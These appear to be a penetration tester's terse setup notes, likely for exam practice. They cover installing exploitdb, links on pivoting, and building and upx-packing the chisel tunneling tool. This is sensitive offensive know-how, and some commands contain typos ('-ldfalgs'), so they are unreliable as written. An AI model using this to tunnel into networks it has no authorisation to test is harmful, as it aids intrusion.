    apt -y install exploitdb exploitdb-papers   #time consuming, not needed for test, adding research papers
    
    
    
pivot stuff
https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
https://www.puckiestyle.nl/pivot-with-chisel/





Port forwarding
install Go 
   https://golang.org/doc/install
      tar -C /usr/local -xzf go1.15.2.linux-amd64.tar.gz
      export PATH=$PATH:/usr/local/go/bin
      go version
Download chisel
   git clone https://github.com/jpillora/chisel
Compile
   go build 
Reduce file size
   go build -ldfalgs="-s -w"
   upx brute chiseldu 
   

